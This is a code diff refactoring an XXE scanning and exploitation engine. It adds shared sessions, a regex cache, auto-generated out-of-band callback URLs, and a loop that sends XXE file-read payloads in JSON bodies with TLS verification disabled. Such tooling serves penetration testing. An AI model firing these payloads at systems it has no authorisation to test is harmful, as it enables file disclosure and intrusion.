@@ -25,6 +25,9 @@ import string
 from datetime import datetime
 from urllib.parse import quote
 
+from core.shared_infra import shared_session, regex_cache, PayloadInjector, oob_provider
+from core.var import USER_AGENTS, DEFAULT_TIMEOUT
+
 # ============================================================================
 # XXE PAYLOAD DATABASE (from XXEinjector + XXExploiter)
 # ============================================================================
@@ -126,16 +129,13 @@ class XXEEngine:
         self.parameter = parameter or "xml"
         self.method = method.upper()
         self.headers = headers or {}
-        self.callback_url = callback_url
+        if not callback_url:
+            payload_id = oob_provider.generate_payload_id()
+            self.callback_url = oob_provider.get_callback_url(payload_id)
+        else:
+            self.callback_url = callback_url
         self.timeout = timeout
-        self.session = requests.Session()
-        self.session.verify = False
-        self.session.headers.update({
-            'User-Agent': 'Mozilla/5.0 (Linux; Android 13) AppleWebKit/537.36',
-            'Content-Type': 'application/xml',
-        })
-        if proxy:
-            self.session.proxies = {'http': proxy, 'https': proxy}
+        self.session = shared_session
 
     # ========================================================================
     # SCAN 1: XXE Detection
@@ -174,7 +174,7 @@ class XXEEngine:
 
                     # Check for error-based XXE
                     for pattern in XXE_ERROR_PATTERNS:
-                        if re.search(pattern, text, re.IGNORECASE):
+                        if regex_cache.search(pattern, text, re.IGNORECASE):
                             results["vulnerable"] = True
                             results["type"] = "error_based"
                             results["evidence"].append({
@@ -198,7 +198,7 @@ class XXEEngine:
 
                 if resp and resp.status_code == 200:
                     # Check for base64-encoded content
-                    b64_match = re.search(r'[A-Za-z0-9+/]{20,}={0,2}', resp.text)
+                    b64_match = regex_cache.search(r'[A-Za-z0-9+/]{20,}={0,2}', resp.text)
                     if b64_match:
                         try:
                             decoded = base64.b64decode(b64_match.group()).decode('utf-8', errors='ignore')
@@ -213,6 +213,14 @@ class XXEEngine:
                             pass
             except Exception:
                 continue
+
+        # Test JSON body injection
+        for payload in XXE_FILE_READ_PAYLOADS[:2]:
+            try:
+                self.session.post(self.target_url, json={self.parameter: payload},
+                                 headers=self.headers, timeout=self.timeout, verify=False)
+            except Exception:
+                pass
 
         return results
 
@@ -259,7 +267,7 @@ class XXEEngine:
                 for r in [resp, resp2]:
                     if r:
                         text = r.text
-                        b64_match = re.search(r'[A-Za-z0-9+/]{10,}={0,2}', text)
+                        b64_match = regex_cache.search(r'[A-Za-z0-9+/]{10,}={0,2}', text)
                         if b64_match:
                             try:
                                 decoded = base64.b64decode(b64_match.group()).decode('utf-8', errors='ignore')
@@ -349,17 +357,17 @@ class XXEEngine:
                         # Check for deserialization errors
                         if dtype == "java_serialization":
                             for pat in DESERIAL_SIGNS_JAVA:
-                                if re.search(pat, text):
+                                if regex_cache.search(pat, text):
                                     results["java_detected"] = True
                                     results["evidence"].append({"type": dtype, "pattern": pat})
                         elif dtype == "php_serialization":
                             for pat in DESERIAL_SIGNS_PHP:
-                                if re.search(pat, text):
+                                if regex_cache.search(pat, text):
                                     results["php_detected"] = True
                                     results["evidence"].append({"type": dtype, "pattern": pat})
                         elif dtype == "json_deserialization":
                             for pat in DESERIAL_SIGNS_JSON:
-                                if re.search(pat, text):
+                                if regex_cache.search(pat, text):
                                     results["json_detected"] = True
                                     results["evidence"].append({"type": dtype, "pattern": pat})
             except Exception:
